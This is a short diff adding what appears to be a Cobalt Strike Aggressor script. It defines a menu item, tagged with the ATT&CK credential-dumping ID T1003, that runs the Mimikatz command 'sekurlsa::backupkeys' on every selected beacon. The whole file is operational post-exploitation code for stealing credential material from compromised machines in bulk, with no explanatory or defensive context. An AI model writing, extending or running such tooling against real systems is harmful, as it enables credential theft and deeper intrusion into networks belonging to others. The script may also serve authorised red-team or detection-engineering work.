@@ -1,0 +1,14 @@
+item "Mimikatz Backup Keys  - T1003"{
+			local('$bid');
+				foreach $bid ($1){
+					backupkeys($bid);
+				}
+			}
+			
+			
+			
+sub backupkeys{
+
+bmimikatz($1, "sekurlsa::backupkeys");
+
+}			
